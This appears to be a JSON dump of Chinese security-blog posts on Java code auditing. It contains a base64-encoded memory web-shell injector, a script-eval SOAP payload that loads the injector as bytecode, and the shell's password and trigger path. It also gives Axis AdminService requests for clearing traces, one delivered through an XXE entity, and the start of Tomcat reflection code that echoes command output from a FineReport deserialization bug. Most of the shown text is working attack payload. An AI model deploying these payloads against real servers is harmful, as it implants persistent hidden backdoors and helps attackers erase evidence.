SGFLR01zZDJGKzIwcitaTFZEUGVYWGU1OU9FL3JJZnBhejlFdDhMNUNNd1VLOGhSVUs2aFJVS3VnVHFGeG9XRGpmeUJhZUpPeDVWbVYxMDlUUjViSFJqdjhIUnlSVmtLaXV6SjQ5MWw4TG5pSWwwdW83WjVFYVUvbG5EZGZvM2NTSHY1Q3AremNYb0dWeEZoRm56WkllSHJMalkvakV2VkZya2FpTm9odUdZT2VxdUR4cDFCU3hmeVlKdEt5Um05VkdoZDdKbDk1S2ZROEF0TTQyY2NpZWU3WmtEZU5yNGVvOEsxVDlHOFppcGw5SjEzK2E4a0MwRXI4M1dTdm5iTWRuTytreE8xTTZUMU02QzV5czVlTTdtTkU5bE0rWW5OZFJ6L1c4UC96K0FKWFRZL3dSWnl5Mld6QWFkWVJQOUpKMUpmd1pkNzVSWVpuY01hT0JMZys3OHRRRkV3cE9OR2o0R1JoWUE1MVFoNWczTVcrekNES3hVNEV2MzhXUCs0T0JWLzBYc0NKUGsrd0k1TEdMMExNTXI0ZjcvTlU4dlYzbC9EN3pPOVVkL0NQMUNBN2YvWlFnOEtDOStPVWF2U1drb3NIZzMrZGkxVHFYUXpIcnRjYWVqK1RyV3ZwRW5qcUw4QkJqdmFUalh1NDNrUGs2RjZibFZzNFU4QWNlb0dyemVOTXMvM2s0WHdWdmsxK3ZOUzRqWng5eDY3K2lVd0dUdUM3Tm1mMVRwY1lrNGsxU3dyK0I3amErOUJuRWdBQQgAEAEABjxpbml0PgEAFShMamF2YS9sYW5nL1N0cmluZzspVgwAEgATCgAPABQBAAMoKVYBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwAXAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAIbGlzdGVuZXIBABJMamF2YS9sYW5nL09iamVjdDsBAAdjb250ZXh0AQAIY29udGV4dHMBABBMamF2YS91dGlsL0xpc3Q7AQAEdGhpcwEAJExvcmcvYXBhY2hlL2NvbW1vbnMvbGFuZy9iZS9DU1ZVdGlsOwEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBACRMamF2YS91dGlsL0xpc3Q8TGphdmEvbGFuZy9PYmplY3Q7PjsBAA5qYXZhL3V0aWwvTGlzdAcAJAEAEmphdmEvdXRpbC9JdGVyYXRvcgcAJgEADVN0YWNrTWFwVGFibGUMABIAFgoABAApAQAKZ2V0Q29udGV4dAEAEigpTGphdmEvdXRpbC9MaXN0OwwAKwAsCgACAC0BAAhpdGVyYXRvcgEAFigpTGphdmEvdXRpbC9JdGVyYXRvcjsMAC8AMAsAJQAxAQAHaGFzTmV4dAEAAygpWgwAMwA0CwAnADUBAARuZXh0AQAUKClMamF2YS9sYW5nL09iamVjdDsMADcAOAsAJwA5AQALZ2V0TGlzdGVuZXIBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAOwA8CgACAD0BAAthZGRMaXN0ZW5lcgEAJyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspVgwAPwBACgACAEEBAARrZXkxAQAIY2hpbGRyZW4BABNMamF2YS91dGlsL0hhc2hNYXA7AQADa2V5AQALY2hpbGRyZW5NYXABAAZ0aHJlYWQBABJMamF2YS9sYW5nL1RocmVhZDsBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAHdGhyZWFkcwEAE1tMamF2YS9sYW5nL1RocmVhZDsHAE0BABBqYXZhL2xhbmcvVGhyZWFkBwBPAQARamF2YS91dGlsL0hhc2hNYXAHAFEBABNqYXZhL3V0aWwvQXJyYXlMaXN0BwBTCgBUACkBAApnZXRUaHJlYWRzCABWAQAMaW52b2tlTWV0aG9kAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsMAFgAWQoAAgBaAQAHZ2V0TmFtZQwAXAAGCgBQAF0BABxDb250YWluZXJCYWNrZ3JvdW5kUHJvY2Vzc29yCABfAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoMAGEAYgoADwBjAQAGdGFyZ2V0CABlAQAFZ2V0RlYMAGcAWQoAAgBoAQAGdGhpcyQwCABqCABEAQAGa2V5U2V0AQARKClMamF2YS91dGlsL1NldDsMAG0AbgoAUgBvAQANamF2YS91dGlsL1NldAcAcQsAcgAxAQADZ2V0DAB0ADwKAFIAdQEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwwAdwB4CgAEAHkBAA9qYXZhL2xhbmcvQ2xhc3MHAHsKAHwAXQEAD1N0YW5kYXJkQ29udGV4dAgAfgEAA2FkZAEAFShMamF2YS9sYW5nL09iamVjdDspWgwAgACBCwAlAIIBABVUb21jYXRFbWJlZGRlZENvbnRleHQIAIQBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7DACGAIcKAFAAiAEACHRvU3RyaW5nDACKAAYKAHwAiwEAGVBhcmFsbGVsV2ViYXBwQ2xhc3NMb2FkZXIIAI0BAB9Ub21jYXRFbWJlZGRlZFdlYmFwcENsYXNzTG9hZGVyCACPAQAJcmVzb3VyY2VzCACRCAAdAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24HAJQBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYMABIAlgoAlQCXAQAgamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb24HAJkBAB9qYXZhL2xhbmcvTm9TdWNoTWV0aG9kRXhjZXB0aW9uBwCbAQAramF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvblRhcmdldEV4Y2VwdGlvbgcAnQEACVNpZ25hdHVyZQEAJigpTGphdmEvdXRpbC9MaXN0PExqYXZhL2xhbmcvT2JqZWN0Oz47AQATamF2YS9sYW5nL1Rocm93YWJsZQcAoQEACWNsYXp6Qnl0ZQEAAltCAQALZGVmaW5lQ2xhc3MBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABWNsYXp6AQARTGphdmEvbGFuZy9DbGFzczsBAAtjbGFzc0xvYWRlcgEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyBwCrAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7DACtAK4KAFAArwEADmdldENsYXNzTG9hZGVyDACxAIcKAHwAsgwABQAGCgACALQBAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7DAC2ALcKAKwAuAEAC25ld0luc3RhbmNlDAC6ADgKAHwAuwwACgAGCgACAL0BAAxkZWNvZGVCYXNlNjQBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCDAC/AMAKAAIAwQEADmd6aXBEZWNvbXByZXNzAQAGKFtCKVtCDADDAMQKAAIAxQgApQcApAEAEWphdmEvbGFuZy9JbnRlZ2VyBwDJAQAEVFlQRQwAywCoCQDKAMwBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsMAM4AzwoAfADQAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kBwDSAQANc2V0QWNjZXNzaWJsZQEABChaKVYMANQA1QoA0wDWAQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsMANgA2QoAygDaAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DADcAN0KANMA3gEAB29iamVjdHMBABNbTGphdmEvbGFuZy9PYmplY3Q7AQAJbGlzdGVuZXJzAQAJYXJyYXlMaXN0AQAVTGphdmEvdXRpbC9BcnJheUxpc3Q7AQAKaXNJbmplY3RlZAEAJyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspWgwA5QDmCgACAOcBABthZGRBcHBsaWNhdGlvbkV2ZW50TGlzdGVuZXIIAOkBAF0oTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMAFgA6woAAgDsAQAcZ2V0QXBwbGljYXRpb25FdmVudExpc3RlbmVycwgA7gcA4QEAEGphdmEvdXRpbC9BcnJheXMHAPEBAAZhc0xpc3QBACUoW0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS91dGlsL0xpc3Q7DADzAPQKAPIA9QEAGShMamF2YS91dGlsL0NvbGxlY3Rpb247KVYMABIA9woAVAD4CgBUAIIBABxzZXRBcHBsaWNhdGlvbkV2ZW50TGlzdGVuZXJzCAD7AQAHdG9BcnJheQEAFSgpW0xqYXZhL2xhbmcvT2JqZWN0OwwA/QD+CgBUAP8BAAFpAQABSQEADWV2aWxDbGFzc05hbWUBABJMamF2YS9sYW5nL1N0cmluZzsBAARzaXplAQADKClJDAEFAQYKAFQBBwEAFShJKUxqYXZhL2xhbmcvT2JqZWN0OwwAdAEJCgBUAQoBAAxkZWNvZGVyQ2xhc3MBAAdkZWNvZGVyAQAHaWdub3JlZAEACWJhc2U2NFN0cgEAFExqYXZhL2xhbmcvQ2xhc3M8Kj47AQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcggBEQEAB2Zvck5hbWUMARMAtwoAfAEUAQAMZGVjb2RlQnVmZmVyCAEWAQAJZ2V0TWV0aG9kDAEYAM8KAHwBGQEAEGphdmEudXRpbC5CYXNlNjQIARsBAApnZXREZWNvZGVyCAEdAQAGZGVjb2RlCAEfAQAgamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb24HASEBAA5jb21wcmVzc2VkRGF0YQEAA291dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAJpbgEAHkxqYXZhL2lvL0J5dGVBcnJheUlucHV0U3RyZWFtOwEABnVuZ3ppcAEAH0xqYXZhL3V0aWwvemlwL0daSVBJbnB1dFN0cmVhbTsBAAZidWZmZXIBAAFuAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0HASwBABxqYXZhL2lvL0J5dGVBcnJheUlucHV0U3RyZWFtBwEuAQAdamF2YS91dGlsL3ppcC9HWklQSW5wdXRTdHJlYW0HATAKAS0AKQEABShbQilWDAASATMKAS8BNAEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgwAEgE2CgExATcBAARyZWFkAQAFKFtCKUkMATkBOgoBMQE7AQAFd3JpdGUBAAcoW0JJSSlWDAE9AT4KAS0BPwEAC3RvQnl0ZUFycmF5AQAEKClbQgwBQQFCCgEtAUMBAANvYmoBAAlmaWVsZE5hbWUBAAVmaWVsZAEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAARnZXRGAQA/KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xh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';var bytecode;try&#123;var clsBase64 = classLoader.loadClass('java.util.Base64');var clsDecoder = classLoader.loadClass('java.util.Base64$Decoder');var decoder = clsBase64.getMethod('getDecoder').invoke(base64Clz);bytecode = clsDecoder.getMethod('decode', clsString).invoke(decoder, bytecodeBase64);&#125; catch (ee) &#123;try &#123;var datatypeConverterClz = classLoader.loadClass('javax.xml.bind.DatatypeConverter');bytecode = datatypeConverterClz.getMethod('parseBase64Binary', clsString).invoke(datatypeConverterClz, bytecodeBase64);&#125; catch (eee) &#123;var clazz1 = classLoader.loadClass('sun.misc.BASE64Decoder');bytecode = clazz1.newInstance().decodeBuffer(bytecodeBase64);&#125;&#125;var clsClassLoader = classLoader.loadClass('java.lang.ClassLoader');var clsByteArray = (new java.lang.String('a').getBytes().getClass());var clsInt = java.lang.Integer.TYPE;var defineClass = clsClassLoader.getDeclaredMethod('defineClass', [clsByteArray, clsInt, clsInt]);defineClass.setAccessible(true);var clazz = defineClass.invoke(classLoader,bytecode,new java.lang.Integer(0),new java.lang.Integer(bytecode.length));clazz.newInstance();&#125;&#125;   test();]]&gt;&lt;/arg0&gt;&lt;arg1 xmlns=\"\" xsi:type=\"urn:SimpleScriptContext\" xmlns:urn=\"urn:beanservice\"&gt;&lt;/arg1&gt;&lt;/eval&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;\n\n密码: ndrqjxdtldybh请求路径: /defaultroot/login.jsp请求头: User-Agent: Viglqru脚本类型: JSP内存马类名: org.apache.commons.lang.ServletContextWbqsbkListener注入器类名: org.apache.commons.lang.be.CSVUtil\n\n\n\n\n\n\n\n\n痕迹清理：卸载服务POST /axis/services/AdminService HTTP/1.1Host: 192.168.123.136:8080Connection: closeAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0Accept-Language: en-US,en;q=0.5SOAPAction: somethingUpgrade-Insecure-Requests: 1Content-Type: application/xmlAccept-Encoding: gzip, deflateContent-Length: 463&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soapenv:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;        xmlns:api=&quot;http://127.0.0.1/Integrics/Enswitch/API&quot;        xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;        xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;  &lt;soapenv:Body&gt;&lt;undeployment xmlns=&quot;http://xml.apache.org/axis/wsdd/&quot;&gt; &lt;service name=&quot;test1Service&quot;/&gt;&lt;/undeployment&gt;  &lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;\n\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE aaa [&lt;!ENTITY name SYSTEM &quot;http://127.0.0.1:7001/defaultroot/services/./AdminService?method=%21--%3E%3Cundeployment%20xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%3E%0A%20%3Cservice%20name%3D%22giqmdService%22%2F%3E%0A%3C%2Fundeployment&quot; &gt;]&gt;&lt;name&gt;&amp;name;&lt;/name&gt;\n\n!--&gt;&lt;undeployment xmlns=&quot;http://xml.apache.org/axis/wsdd/&quot;&gt; &lt;service name=&quot;giqmdService&quot;/&gt;&lt;/undeployment\n\n","categories":["代码审计","漏洞分析"],"tags":["java代码审计"]},{"title":"帆软反序列化代码执行回显","url":"/2024/03/11/%E5%B8%86%E8%BD%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%9B%9E%E6%98%BE/","content":"前言最近在学习帆软channel接口的二次反序列化绕过相关知识，再对这个漏洞进行武器化的时候，本想通过pen4uin师傅的JEG这个工具直接生成一条tomcat下可回显的命令执行利用链进行利用，但是生成的利用链在帆软FineBi 1.1.18下无法利用成功，我的找到的版本不能调试，打上断点就是灰色斜杠，不知道具体原因，加上此前也对这类回显没有过研究，借此机会，学习一下命令执行回显的艺术。\nRequest对象此前对命令执行回显了解甚少，拜读各位师傅文章，了解到几种回显的方式，最优雅的方式就是去获取Request对象进行回显，获取Request对象，再通过Request对象获取Response对象，反射调用addHeader或者doWrite方法进行回显。那么回显的关键就是在tomcat中如何去找到并获取Request对象。\n这里本地写了个demo，模拟帆软的反序列化漏洞点，用tomcat部署了起来，打上断点进行调试。\n\n\n\n\n\n\n\n主要就是线程中找到存放Request对象全局变量，不班门弄斧了，这点师傅们早已得出了结论。\n用idea执行表达式得功能 执行 Thread.getThreads()，获取所有线程。\n\n\n\n\n\n\n\n在线程名为http-nio-8081-Acceptor-0里面有一个属性名target的NioEndpoint$Acceptor对象，NioEndpoint$Acceptor对象里面存放一个属性名为this$0的NioEndpoint对象，this$0里面存放一个属性名为handler的AbstractProtocol$ConnectionHandler对象，handler里面存放了一个属性global的RequestGroupInfo对象，在global里面存放了一个processors的ArrayList对象，processors存放着RequestInfo对象，RequestInfo对象中存放着Request对象。\n很绕，直接看图。\n\n\n\n\n\n\n\nThread.getThreads()  ---&gt; Thread[10] = Thread[http-nio-8081-Acceptor-0,5,main]   ---&gt; target = NioEndpoint$Acceptor    ---&gt; this$0 = NioEndpoint     ---&gt; handler = AbstractProtocol$ConnectionHandler      ---&gt; global =\tRequestGroupInfo       ---&gt; processors = ArrayList        ---&gt;  req = Request\n\n通过如上的链条，一步步反射去获取最终的Request对象，然后拿到Respone对象，addHeader或者doWrite方法进行回显。\n坑点\n在反射获取handler属性的时候，会报错java.lang.NoSuchFieldException\n\n\n\n\n\n\n\n解决办法是需要从父类的父类当中获取\n\n\n\n\n\n\n\n最终通过代码执行获取并回显的代码如下\npackage example2;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.nio.charset.StandardCharsets;import java.util.ArrayList;public class TomcatEchoDemo extends AbstractTranslet &#123;    public TomcatEchoDemo() throws Exception &#123;        // 拿到所有线程        // Thread[] threads = Thread.getThreads();        Object t = Thread.currentThread();        Field group = t.getClass().getSuperclass().getDeclaredField(\"group\");        group.setAccessible(true);        Object o = group.get(t);        Field ts = o.getClass().getDeclaredField(\"threads\");        ts.setAccessible(true);        Thread[] threads = (Thread[]) ts.get(o);        for (Thread thread:threads) &#123;            // 获取名中 包含 http  和 Acceptor 关键字的线程            if (thread.getName().contains(\"http\") &amp;&amp; thread.getName().contains(\"Acceptor\"))&#123;                // 获取target (NioEndpoint$Acceptor)                Field field = thread.getClass().getDeclaredField(\"target\");                field.setAccessible(true);                Object obj = field.get(thread);                System.out.println(obj.getClass().getName());                // 获取 this$0 (NioEndpoint)                field = obj.getClass().getDeclaredField(\"this$0\");                field.setAccessible(true);                obj = field.get(obj);                System.out.println(obj.getClass().getName());                // handel (AbstractProtocol$ConnectionHandler)                field = obj.getClass().getSuperclass().getSuperclass().getDeclaredField(\"handler\");                field.setAccessible(true);                obj = field.get(obj);                System.out.println(obj.getClass().getName());                // global (RequestGroupInfo)                field = obj.getClass().getDeclaredField(\"global\");                field.setAccessible(true);                obj = field.get(obj);                System.out.println(obj.getClass().getName());                // 获取 processors (ArrayList)                field = obj.getClass().getDeclaredField(\"processors\");                field.setAccessible(true);                ArrayList lists = (ArrayList) field.get(obj);                System.out.println(lists.getClass().getName());                // 获取req                for (Object obj1: lists)&#123;                    Field req = obj1.getClass().getDeclaredField(\"req\");                    req.setAccessible(true);                    Object request = req.get(obj1);                    System.out.println(request.getClass().getName());          